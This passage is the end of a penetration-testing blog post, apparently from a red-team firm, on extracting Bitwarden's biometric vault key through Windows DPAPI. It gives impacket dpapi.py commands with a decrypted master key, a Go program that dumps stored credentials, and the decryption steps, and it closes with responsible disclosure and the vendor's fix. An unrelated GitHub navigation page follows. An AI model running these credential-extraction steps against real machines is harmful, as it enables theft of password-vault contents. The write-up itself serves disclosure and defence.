</span></span><span><span>MasterKeyLen: <span>00000088</span> <span>(</span>136<span>)</span>
</span></span><span><span>BackupKeyLen: <span>00000068</span> <span>(</span>104<span>)</span>
</span></span><span><span>CredHistLen : <span>00000000</span> <span>(</span>0<span>)</span>
</span></span><span><span>DomainKeyLen: <span>00000174</span> <span>(</span>372<span>)</span>
</span></span><span><span>
</span></span><span><span>Decrypted key with domain backup key provided
</span></span><span><span>Decrypted key: 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
</span></span></code></pre></div><p>It was now simply a matter of using this key to decrypt the Biometric login
credentials which are necessary to get into the Bitwarden vault:</p>
<!-- raw HTML omitted -->
<div><pre tabindex="0"><code data-lang="shell"><span><span>$ dpapi.py credential -f ./C6530B1481D73604A6A51D114372F1AA -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
</span></span><span><span>Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright <span>2022</span> Fortra
</span></span><span><span>
</span></span><span><span><span>[</span>CREDENTIAL<span>]</span>
</span></span><span><span>LastWritten : 2023-11-28 14:02:38
</span></span><span><span>Flags       : 0x00000030 <span>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH<span>)</span>
</span></span><span><span>Persist     : 0x00000003 <span>(</span>CRED_PERSIST_ENTERPRISE<span>)</span>
</span></span><span><span>Type        : 0x00000001 <span>(</span>CRED_TYPE_GENERIC<span>)</span>
</span></span><span><span>Target      : LegacyGeneric:target<span>=</span>Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric
</span></span><span><span>Description :
</span></span><span><span>Unknown     :
</span></span><span><span>Username    : ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric
</span></span><span><span>Unknown     : <span>"6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE="</span>
</span></span></code></pre></div><p>This revealed the <em>biometric key</em> (a copy of the previously described <em>derived
key</em>), which grants access to the Bitwarden vault:
<code>6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE=</code></p>
<p>This means that we don‚Äôt need the main password, we don‚Äôt need the fingerprint
for biometrics, we don‚Äôt even have to use a keylogger or dump Bitwarden‚Äôs
process memory. This also means that we don‚Äôt have to wrestle with endpoint
protection and we don‚Äôt need to wait for the actual user to unlock the vault. We
simply have to use DPAPI as it was designed. We seriously doubt any user is
aware of these implications when enabling Windows Hello for their vault.</p>
<p>So far we only have shown the <em>derived/biometric key</em>, which is sufficient to
decrypt the vault. In practice, however, there is still a little legwork we
have to do. After all, our goal was not to demonstrate that we <em>could</em> decrypt
the vault but to get actual credentials from the vault.</p>
<h3 id="breaking-into-the-vault">Breaking Into the Vault</h3>
<p>We first had to figure out how to decrypt the Bitwarden <em>account encryption
key</em>, which protects all other information in the vault. Credentials are not
always encrypted with the <em>account encryption key</em> directly since Bitwarden
also supports usage scenarios where some credentials should be shared in an
organization, for example. This is solved by adding additional layers of keys
(private and organizational keys), which are used to encrypt organization
credentials, and are also protected using the <em>account encryption key</em>. Take a
look at the figure below if you are starting to get confused about all the keys
involved in this story.</p>



    <a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg">
        <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg" alt="Overview of keys">
        </p>
        <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg" alt="Overview of keys">
        </p>
    </a>
    

<p>The decryption process therefore consists of three main steps: (1) Decryption
of the <em>account encryption key</em> using the <em>biometric key</em>, (2) decryption of the
second layer of keys using the <em>account encryption key</em> and (3) decryption of the
credentials using either the <em>account encryption key</em> or one of the intermediate
keys. We then set out to write a Python script to automate the decryption. Let‚Äôs
walk through each step:</p>
<ol>
<li>
<p>We started by extracting the user object from the Bitwarden data file
<code>data.json</code>. The user object contains the encrypted credentials (in the
<code>data</code> section) and the encryption keys (in the <code>keys</code> section), in addition
to (unencrypted) information about the user account like the email address
(<code>profile</code>), settings like the online vault URL (<code>settings</code>) and more. The
user section can be identified by searching for a UUID which is used as key
in the JSON object:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"ea0b6061-4381-4534-9e91-50cf98753530"</span><span>:</span> {
</span></span><span><span>    <span>"data"</span>: {
</span></span><span><span>        <span>[...]</span>
</span></span><span><span>    <span>"keys"</span>: {
</span></span><span><span>        <span>"cryptoSymmetricKey"</span>: {
</span></span><span><span>            <span>"encrypted"</span>: <span>"2.Z9+7NUlzujEYKrRX+x22+A==|rB5YmxVMKo9tJtNSmRT8mpVQu7GEAHhKndJBXKBwWfW1rw6i3x003ZPligtJCmWXpdHIryF2fb5KdETAvr9QLws27A8z3ZAO4KNAgrzGH14=|PuD7z8am9+l09gM8SDFUU8hvFa02x30gYqJXe7Ac6mI="</span>
</span></span><span><span>        },
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div><p>Since Bitwarden uses different types of encryption for different scenarios,
all encrypted values are stored using a particular format, which starts with
an <em>encryption type</em> identifier (<a href="https://github.com/bitwarden/clients/blob/master/libs/common/src/platform/enums/encryption-type.enum.ts">from
GitHub</a>):</p>
<div><pre tabindex="0"><code data-lang="rust"><span><span><span>export</span> <span>enum</span> <span>EncryptionType</span> {
</span></span><span><span>  <span>AesCbc256_B64</span> <span>=</span> <span>0</span>,
</span></span><span><span>  <span>AesCbc128_HmacSha256_B64</span> <span>=</span> <span>1</span>,
</span></span><span><span>  <span>AesCbc256_HmacSha256_B64</span> <span>=</span> <span>2</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha256_B64</span> <span>=</span> <span>3</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha1_B64</span> <span>=</span> <span>4</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha256_HmacSha256_B64</span> <span>=</span> <span>5</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha1_HmacSha256_B64</span> <span>=</span> <span>6</span>,
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>/** [...]
</span></span></span><span><span><span> * Example of annotated serialized EncStrings:
</span></span></span><span><span><span> * 0.iv|data
</span></span></span><span><span><span> * 1.iv|data|mac
</span></span></span><span><span><span> * 2.iv|data|mac
</span></span></span><span><span><span> * 3.data
</span></span></span><span><span><span> * 4.data
</span></span></span><span><span><span> [...]
</span></span></span></code></pre></div><p>As indicated by the leading 2, our account encryption key was encrypted
using AES-CBC-256, and integrity-protected using an HMAC based on SHA-256.
Before decrypting the account key with the biometric key, it has to be
expanded using <a href="https://en.wikipedia.org/wiki/HKDF">HKDF-expand</a>, though.</p>
</li>
<li>
<p>With the account encryption key, we were able to decrypt the second layer of
keys, which were all stored in the <code>"keys"</code> part of the user object as well.</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>    <span>"privateKey"</span><span>:</span> {
</span></span><span><span>        <span>"encrypted"</span>: <span>"2.JbYuUgAf3yIDWfKAZdAi7w==|7OHkUd5GY5akE7IqLGRfJW4cL6P9KltcJOhLepjGPsyOBt0Jzr5+PPakvp8Fz3pgAYNXszCqDP8aqz/q+JhsZVtx5VP3OE6KINdmBvWEO0EX0PEMxtI08WiDNKadlFgNG9zyotIsA+6MA0cDwMIdKYPUWv7P3JB2Y0W9jlqeQQkPerg3voEvGLHOUa48xv7hJt3Q8fIPH3yoo9i5UN042QNEBmn9GBYdFw0gMNdDvMnK47j8kHQ+18SBMpIG0tjLylEmN0aA1QOXq9XHaorguOowUaLQU5funOiurFPpXv7CuXdlJiYak8nBQjdEj9euAEKe4himejHak0CUwMsNqqF7HdAhpLdGLY/gtskd/2e9v8Gwq93nBGNfRBTtfO8tWRWf+ygFqninfR9QquIHQ7BPJMHXsupoOUFlwNV7RVrG1Qa64sv0k1ksP38GyY8jzU2YZVsLWPjwHdHwXIeZzwC2CQ7JO6x9i/zkT9GJIEMBRAf6WBcIy0Q8J1LZvzlIEAJDqZaungjfwKDovaJVCHAq4WTaM0SyNj01RNARsLbVCweGlx1eQ6jootNdovOTR4jprmWwyfe9FQf9Xabm40Bwx8E2jZY2TxyS+Y0TzhdO3Rg0gETb8GHIlXeTU28fPVusjopv0eZXwe97NQhvyhDXCrZM7/546rCIvWTdcmouKdQEaXUXe02nuJl8UGjqqLuuKNxFfNez+RY7khCf7xU5wXzoC/90pNP1nM0FkB9IPe/J7EUvhBHrD+dP+6SxJ9mPDByN/u68kvBeu8R3dn234zJiqDNFWtmliGJMrYybzmViHI70tDxInv/9KoJfJK6QD+SypcEJjytZm+U8kEaWHkaxyMMUQIaHdmmhDYixjC6iclZWvAk5nMhf0wQm5NJJdfIQTWoID4kOMoS71OXExVkLVm93O5AflyD5jcWu/z6IThDY7nEg35t2ziRM1djkhnkK0Eunp45u/bpfhwYsMCnM8IJEiZ9kOOkFfCWCOZJwsk2uINmTBp8PKJD06sluhFKdOFtEDP7PMhEKVt2D2a1yMPT4PCdLYiSe18PQloUgBWC8ica4BVcGnTjGKkloqLNHF8T4nd1igW+LL+FbAj4DVJVciTV6hdHhdf0xmIoz+OhvIfzrmYxy5hjJjmesSvZq8FuK6G746cFCIQmGjT7lZuQcaR2msWawsIEcjFFFy6vIRiwQo72yeyCAmDEbgETLjSfs3jrhXf8pvcEWuci8bpsOV1zr+Od60OU+/30cFal2guazAlIT2jF+zvpf+qWC/A7lVu0iroTAoXu8/IOLxLpaF+xSso7kbrNbsKyx2fJuhNdTLOrqvnv4rw+73n11/fhF3506eN3ULj57kGFIKnRIkueMMwS7DIMla8BPT1rrUNZarTyDupF63KSjJbG9nPXneBeWjHi43jsW78PMtndfqrAr9pn02Me9vYGl8nhseEGArR3iN2fTkrWbV3wwjTbMnGfk4Z43fhsAKaGet6gjmLmcGhbeC2wSEAFgTnoMLZM/CUcqFBopyvMNVkAUs495qZCNvqgpT5f7DrJuzq+GbHK8fypdF+qxwUeUyDzFQfTvf1gKc+ISDYN0mXqDNH1II5aMu/4j0U4gvlO9vxKfJxms2tq0WGY=|3AsNkNSpAWpyHBSa2gjkJHff5vqnoU1yysEmLeXbgYc="</span>
</span></span><span><span>    }
</span></span></code></pre></div><p>As can be inferred from the encryption type, this key was also encrypted
using AES-CBC. In our test setup, the private RSA key could be used to
decrypt additional organizational keys, which were in turn required to
access organization-specific credentials.</p>
</li>
<li>
<p>Having obtained all intermediate keys, we were finally able to extract the
desired credentials:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"46d9d1c2-7595-4c18-989d-053e1bf5336f"</span><span>:</span> {
</span></span><span><span>    <span>"id"</span>: <span>"46d9d1c2-7595-4c18-989d-053e1bf5336f"</span>,
</span></span><span><span>    <span>"organizationId"</span>: <span>null</span>,
</span></span><span><span>    <span>[...]</span>
</span></span><span><span>    <span>"login"</span>: {
</span></span><span><span>        <span>"username"</span>: <span>"2.K+/iMJyO27Wzqos4JtTfmA==|FB1cyKstIHGPBx4GBRk651FZ1zr3NpLBEoe1Vf3FFe4=|Y/2Kur7jIvI/ecXA64ARKs6qy7zLXJh9NVC81+uyeiI="</span>,
</span></span><span><span>        <span>"password"</span>: <span>"2.ALOh5YroSqPCkoyzviK0/g==|FDzMel84he7OPGGLatBgxw==|fVxA3OIeNkLwH3zzDU66F40ykDD0PGUOBSEcpMlp3w8="</span>,
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div><p>This type of credential could be decrypted using the account key directly
(recognizable by the empty <code>organizationId</code>).</p>
<p>Other credentials required intermediate keys (<code>organizationId</code> is set):</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"fad536b0-0b44-4cf2-8741-bca6ce7881d0"</span><span>:</span> {
</span></span><span><span>    <span>"id"</span>: <span>"fad536b0-0b44-4cf2-8741-bca6ce7881d0"</span>,
</span></span><span><span>    <span>"organizationId"</span>: <span>"1d05eff7-8a52-44b1-a004-9835dc485985"</span>,
</span></span><span><span>    <span>[...]</span>
</span></span><span><span>    <span>"login"</span>: {
</span></span><span><span>        <span>"username"</span>: <span>null</span>,
</span></span><span><span>        <span>"password"</span>: <span>"2.qiVz94La8KSO+GaLbUHjGw==|Khqd0v88X8SqC2gTTrQMtQ==|PYFaG7+X9rL8LZUzbo1T3xIATDAOlybnN3tviBST3/c="</span>,
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div></li>
</ol>
<p>Now we can see our <a href="https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/hello-bitwarden.py">vault decryption script</a> in action:</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot.png">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot_hud447096c3f8f9a59a8a76797907affb1_266383_1200x0_resize_q100_bgffffff_box_3.jpg" alt="Terminal output of running python script to decrypt credentials.">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot.png" alt="Terminal output of running python script to decrypt credentials.">
            </p>
        </a>
    

<p>As we had hoped, the Bitwarden vault on the Administrator‚Äôs workstation did
indeed include the credentials to access the special backup system, finally
granting us access to the sought-after backups. You can probably imagine the
astonishment of our client when we told them about the attack, as they had no
idea that domain admins can bypass Bitwarden‚Äôs vault protections.</p>
<p>Well, we‚Äôve always known attackers with domain admin privileges are quite
powerful in the first place, but at least the vault is protected against
unprivileged attackers on the local workstation, right? ‚Ä¶right?</p>
<h3 id="but-wait-theres-more-who-needs-biometrics-anyway">But Wait, There‚Äôs More: Who Needs Biometrics, Anyway?</h3>
<p>In the process of trying to understand this whole mechanism, we started playing
around with DPAPI in our lab setup. For example, we thought that using the API
itself is probably easier than cobbling together the key files from <code>%AppData%</code>.
To familiarize ourselves with DPAPI, we wrote a tiny Go program to see what
credentials are stored in DPAPI on the workstation using the
<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/github.com/danieljoos/wincred">wincred</a> library. The full script is available
<a href="https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/dpapidump/main.go">here</a>, but the only interesting lines are these:</p>
<div><pre tabindex="0"><code data-lang="Go"><span><span><span>creds</span>, <span>err</span> <span>:=</span> <span>wincred</span>.<span>List</span>()
</span></span><span><span><span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
</span></span><span><span>    <span>return</span> <span>fmt</span>.<span>Errorf</span>(<span>"wincred list: %w"</span>, <span>err</span>)
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>for</span> <span>_</span>, <span>cred</span> <span>:=</span> <span>range</span> <span>creds</span> {
</span></span><span><span>    <span>credentialBlob</span>, <span>err</span> <span>:=</span> <span>decodeUTF16LE</span>(<span>cred</span>.<span>CredentialBlob</span>)
</span></span><span><span>    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
</span></span><span><span>        <span>credentialBlob</span> = <span>fmt</span>.<span>Sprintf</span>(<span>"%q"</span>, <span>string</span>(<span>cred</span>.<span>CredentialBlob</span>))
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>	<span>fmt</span>.<span>Printf</span>(<span>"%s:\n    * %s\n"</span>, <span>cred</span>.<span>UserName</span>, <span>credentialBlob</span>)
</span></span><span><span>}
</span></span></code></pre></div><p>It only calls <code>windcred.List()</code> which is a thin Go wrapper around
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew">CredEnumerateW</a>
which simply ‚Äúenumerates the credentials from the user‚Äôs credential set‚Äù.
However, we did not expect that this function immediately spits out Bitwarden‚Äôs
<em>derived/biometrics key</em> without prompting for biometric authentication using
Windows Hello:</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png" alt="Terminal output of Go program that lists DPAPI credentials.">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png" alt="Terminal output of Go program that lists DPAPI credentials.">
            </p>
        </a>
    

<p>This means that any process that runs as the low-privileged user session can
simply ask DPAPI for the credentials to unlock the vault, no questions asked and
no PIN or fingerprint prompt required and Windows Hello is not even involved at
all. The only caveat is that this does not work for other user accounts.</p>
<p>Bitwarden itself does prompt for biometric authentication when unlocking the
vault, but it wouldn‚Äôt even have to. In fact, you could probably remove a few
lines from the source code and have it unlock without a prompt. The whole issue is
likely a result of misunderstanding the details of the <code>CredWriteW</code> function, or
maybe an unawareness of the potential pitfalls of using DPAPI to store
encryption keys.</p>
<h3 id="a-feature-not-a-bug">A Feature, Not a Bug</h3>
<p>We contacted both Bitwarden and Microsoft about the details of this attack. We
always make sure to follow industry best practices for responsible disclosure,
even if it is unclear whether our findings are actual vulnerabilities. For the
attack explained in this blog post, this was the case as it is not clear whether
the attack is in scope of either Bitwarden (since the attack already assumes
access to the workstation of the victim and the Windows domain) or Microsoft
(who are only involved by providing DPAPI to store the decryption keys).
Microsoft indeed responded to our report by stating that DPAPI and its backup
mechanism were used exactly as intended, and that our attack therefore did not
indicate any vulnerabilities on their side.</p>
<p>Bitwarden also responded, however they agreed that this behavior was unintended,
and stated that they were already tracking a similar issue internally. As it
turns out, we were not the first to discover this in March 2023, it had already
been <a href="https://hackerone.com/reports/1874155">reported to Bitwarden through
HackerOne</a>. However, we did not know this
since it was only disclosed in June 2023. Since then the vulnerability is known
as <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27706">CVE-2023-27706</a>.</p>
<p>Bitwarden has since made changes to their codebase to mitigate this particular
scenario, which we will quickly summarize in the next section. They have also
changed the default setting when using Windows Hello as login feature to require
entering the main password at least once when Bitwarden is started.</p>
<h3 id="biometrics-in-bitwarden-now">Biometrics in Bitwarden Now</h3>
<p>To prepare for this blog post, we also took a look at how credentials are stored
in the current version of Bitwarden <a href="https://github.com/bitwarden/clients/releases/tag/desktop-v2023.10.1">Desktop
v2023.10.1</a>.
Bitwarden still makes use of Windows Hello and DPAPI, which are still accessible
using the domain backup key. However the content of the secured data blobs has
changed:</p>
<pre tabindex="0"><code>$ dpapi.py credential -f DAF81666731C8E899E9464647512792B -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|3PqjMDiq1J9hHnO7KESu0fG6Vl4yl2siOImoZghma2FpfNJmfKyGAmJNq00ay3/HV1dd855YMlNc7k3wSam47nxWEAuQU/oCaiPH9q5k9I+OJuvv01HVniqq7ERzRWLp

$ dpapi.py credential -f 1A52DC5CA68038A3E4216121AA1A7E0E -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|Kbo2ptPoXcw3N30AnYA8fw==
</code></pre><p>Instead of storing the valuable <em>derived/biometric key</em> via DPAPI, Bitwarden now
stores two secured data blobs, which are encrypted and can no longer be used to
decrypt the <em>account encryption key</em> directly (indicated by the encryption type
0). The stored data blobs are now additionally encrypted using the
<a href="https://learn.microsoft.com/en-us/uwp/api/windows.security.credentials.keycredentialmanager">KeyCredentialManager
API</a>
which actually requires interaction with Windows Hello to produce a decryption
key. While it seems to us that this fixes the issue, we have not actually tested
the new implementation for other vulnerabilities, yet.</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK 2022 rail station flow images (147 pts)]]></title>
            <link>https://github.com/anisotropi4/kingfisher/blob/main/station.md</link>
            <guid>38852580</guid>
            <pubDate>Wed, 03 Jan 2024 10:37:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/anisotropi4/kingfisher/blob/main/station.md">https://github.com/anisotropi4/kingfisher/blob/main/station.md</a>, See on <a href="https://news.ycombinator.com/item?id=38852580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          <nav aria-label="Global">
            <ul>
                <li>
      
      <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Actions&quot;,&quot;label&quot;:&quot;ref_cta:Actions;&quot;}" href="https://github.com/features/actions">
      
      <div>
        <p>Actions</p><p>
        Automate any workflow
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Packages&quot;,&quot;label&quot;:&quot;ref_cta:Packages;&quot;}" href="https://github.com/features/packages">
      
      <div>
        <p>Packages</p><p>
        Host and manage packages
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Security&quot;,&quot;label&quot;:&quot;ref_cta:Security;&quot;}" href="https://github.com/features/security">
      
      <div>
        <p>Security</p><p>
        Find and fix vulnerabilities
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Codespaces&quot;,&quot;label&quot;:&quot;ref_cta:Codespaces;&quot;}" href="https://github.com/features/codespaces">
      
      <div>
        <p>Codespaces</p><p>
        Instant dev environments
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Copilot&quot;,&quot;label&quot;:&quot;ref_cta:Copilot;&quot;}" href="https://github.com/features/copilot">
      
      <div>
        <p>Copilot</p><p>
        Write better code with AI
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Code review&quot;,&quot;label&quot;:&quot;ref_cta:Code review;&quot;}" href="https://github.com/features/code-review">
      
      <div>
        <p>Code review</p><p>
        Manage code changes
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Issues&quot;,&quot;label&quot;:&quot;ref_cta:Issues;&quot;}" href="https://github.com/features/issues">
      
      <div>
        <p>Issues</p><p>
        Plan and track work
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Discussions&quot;,&quot;label&quot;:&quot;ref_cta:Discussions;&quot;}" href="https://github.com/features/discussions">
      
      <div>
        <p>Discussions</p><p>
        Collaborate outside of code
      </p></div>

    
</a></li>

            </ul>
          </div>
</li>


                <li>
      
      
</li>


                <li>
      
      <div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to GitHub Sponsors&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Sponsors;&quot;}" href="https://github.com/sponsors">
      
      <div>
        <p>GitHub Sponsors</p><p>
        Fund open source developers
      </p></div>

    
</a></li>

            </ul>
          </div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to The ReadME Project&quot;,&quot;label&quot;:&quot;ref_cta:The ReadME Project;&quot;}" href="https://github.com/readme">
      
      <div>
        <p>The ReadME Project</p><p>
        GitHub community articles
      </p></div>

    
</a></li>

            </ul>
          </div>
          
      </div>
</li>


                <li>
    <a data-analytics-event="{&quot;category&quot;:&quot;Header menu top item (logged out)&quot;,&quot;action&quot;:&quot;click to go to Pricing&quot;,&quot;label&quot;:&quot;ref_cta:Pricing;&quot;}" href="https://github.com/pricing">Pricing</a>
</li>

            </ul>
          </nav>

        <div>
                


<qbsearch-input data-scope="repo:anisotropi4/kingfisher" data-custom-scopes-path="/search/custom_scopes" data-delete-custom-scopes-csrf="Jkafbe_Rbcf2AtRT6PBJzics1lgN6GTD37g-DBvSlky4cMlmsrhWrqbSj0fq5rpTOhtPzVY4esXqJXbA4Z69kQ" data-max-custom-scopes="10" data-header-redesign-enabled="false" data-initial-value="" data-blackbird-suggestions-path="/search/suggestions" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations" data-current-repository="anisotropi4/kingfisher" data-current-org="" data-current-owner="anisotropi4" data-logged-in="false" data-copilot-chat-enabled="false" data-blackbird-indexed-repo-csrf="<esi:include src=&quot;/_esi/rails_csrf_token_form_hidden?r=fwnhz5lvKQxCu%2B34U%2FAue0rW9N4vr%2FU4LOkLZaC8yPCOsAXABwhIjpnGlh7YT9JxUBf1fDAUkYGZHR3MNhYRit202QsEJNnch53FwXoYk8xv8Kd%2FXJu2pDZavtN%2Bymgd1bF5W4mjFfwowBnq6YLOdOfB1uQciuTOSQpSlS6S2ax%2FklQgCViSw%2BxCjz7vH8dSCWcIunCzmXGdCaxpHS6LsjoPZqtHZwIQstrUBCumMFev5Ca2wI0j2yPb%2BfoHe0DfxN2LvYwr0BPxvCru%2BdH3lT15nefUt4Zmj0Qhaogw2dwrzUjEHAKn2PzncGaRvM9UEpHAhFaY0H10IY4IBz6%2BWp60wUp90O47TGgohDD7ImD7MAyNNWrFQvpzdxImdYzaR%2BBiXCitCvUuovkigiQ2%2Br15tpGlTQr5WF%2FkdWEe29Z7O8VxiC4qClXbpQA6yB6SpzK0FB0HZZJc0HpFgXeIDbsecCAgyVPUCNorcf%2BdRyIfIknpNHe0AsUB5bSkFtyElOWY3maTsoo7Y729Du7q87CHnXPYnE11vuWDdBB0EvspM86%2B4SDe0Mcp6eKITkXzXpY%3D--v9Iz%2B7veJE9u9tu9--rVsbFN3T2%2FVucffsKj4Z6g%3D%3D&quot; />">
  <div data-modal-dialog-overlay="" data-action="click:qbsearch-input#searchInputContainerClicked">
  <modal-dialog data-action="close:qbsearch-input#handleClose cancel:qbsearch-input#handleClose" data-target="qbsearch-input.searchSuggestionsDialog" role="dialog" id="search-suggestions-dialog" aria-modal="true" aria-labelledby="search-suggestions-dialog-header" data-view-component="true">
      <h2 id="search-suggestions-dialog-header">Search code, repositories, users, issues, pull requests...</h2>
    
</modal-dialog></div>
  
  <div>
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="qbsearch-input.feedbackDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="feedback-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="feedback-dialog-title" aria-describedby="feedback-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="feedback-dialog-title">
        Provide feedback
      </h2>
    </p>
    
  </div>
      
      
</modal-dialog></div>

    <custom-scopes data-target="qbsearch-input.customScopesManager">
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="custom-scopes.customScopesModalDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="custom-scopes-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="custom-scopes-dialog-title" aria-describedby="custom-scopes-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="custom-scopes-dialog-title">
        Saved searches
      </h2>
        <h2 id="custom-scopes-dialog-description">Use saved searches to filter your results more quickly</h2>
    </p>
    
  </div>
      
      
</modal-dialog></div>
    </custom-scopes>
  </div>
</qbsearch-input>

